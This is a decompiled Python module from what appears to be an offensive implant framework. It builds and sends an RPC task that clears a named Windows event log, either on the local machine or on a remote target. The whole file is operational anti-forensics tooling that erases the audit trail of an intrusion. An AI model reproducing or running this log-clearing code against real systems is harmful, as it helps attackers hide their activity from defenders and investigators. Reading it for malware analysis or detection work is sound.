# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_EventLogClear_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogclear', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogclear.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['logfile'] == None or len(lpParams['logfile']) == 0:
        mcl.tasking.OutputError('A log name must be specified')
        return False
    else:
        tgtParams = mca.security.cmd.eventlogclear.Params()
        tgtParams.log = lpParams['logfile']
        if lpParams['remote'] != None:
            tgtParams.target = lpParams['remote']
        if lpParams['classic']:
            tgtParams.flags |= mca.security.cmd.eventlogclear.PARAMS_FLAG_USE_CLASSIC_LOG
        rpc = mca.security.cmd.eventlogclear.tasking.RPC_INFO_CLEAR
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        taskXml = mcl.tasking.Tasking()
        if len(tgtParams.target) > 0:
            taskXml.SetTargetRemote(tgtParams.target)
        else:
            taskXml.SetTargetLocal()
        taskXml.AddSearchMask(tgtParams.log)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.eventlogclear.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)